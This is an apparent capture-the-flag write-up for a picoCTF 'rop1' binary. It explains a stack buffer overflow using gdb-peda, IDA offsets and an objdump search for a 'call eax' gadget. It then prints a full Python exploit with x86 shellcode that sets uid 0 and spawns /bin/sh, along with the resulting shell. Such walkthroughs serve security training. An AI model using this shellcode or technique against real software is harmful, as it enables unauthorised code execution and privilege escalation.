### S0lv3d by H4yicl3

try to download the binary

i use gdb-peda to analysis the code
```
pdis vuln
Dump of assembler code for function vuln:
   0x08048e6d <+0>:     push   ebp
   0x08048e6e <+1>:     mov    ebp,esp
   0x08048e70 <+3>:     sub    esp,0x58
   0x08048e73 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x08048e76 <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x08048e7a <+13>:    lea    eax,[ebp-0x48]
   0x08048e7d <+16>:    mov    DWORD PTR [esp],eax
   0x08048e80 <+19>:    call   0x80481e0
=> 0x08048e85 <+24>:    leave  
   0x08048e86 <+25>:    ret  
```
i am type 16 character A
then i debug i found here
```
EAX: 0xffffd630 ('A' <repeats 16 times>)	<----- after call eax store the buffer
EBX: 0x80481a8 (<_init>:        push   ebx)
ECX: 0xffffd880 ("AAAAAAAAA")
EDX: 0xffffd637 ("AAAAAAAAA")
ESI: 0x0 
EDI: 0x80ea00c --> 0x8067850 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
EBP: 0xffffd678 --> 0xffffd698 --> 0x8049640 (<__libc_csu_fini>:        push   ebx)
ESP: 0xffffd620 --> 0xffffd630 ('A' <repeats 16 times>)
EIP: 0x8048e85 (<vuln+24>:      leave)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048e7a <vuln+13>: lea    eax,[ebp-0x48]
   0x8048e7d <vuln+16>: mov    DWORD PTR [esp],eax
   0x8048e80 <vuln+19>: call   0x80481e0
=> 0x8048e85 <vuln+24>: leave  
```
try use IDA to get the offset
```
-00000048 dest            db ?
+00000004  r              db 4 dup(?)
```
offset = 0x48 + 0x4 = 0x4c =76

that mean we call return to gadget ( call eax)
```
objdump -M intel -d rop1 |grep "call *eax"
 8048d86:       ff d0                   call   eax
```
that mean we can excute the shell with the input is shellcode
```python
padding ="\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
length_shellcode=44
padding +="A"*(76-44)
call_eax = "\x86\x8d\x04\x08"

print padding + call_eax
```

try run it
```
hayicle@ubuntu:~/ctf/pico2014/picoctf$ ./rop1 `python rop1.py`
$ whoami
hayicle
```

well done !!

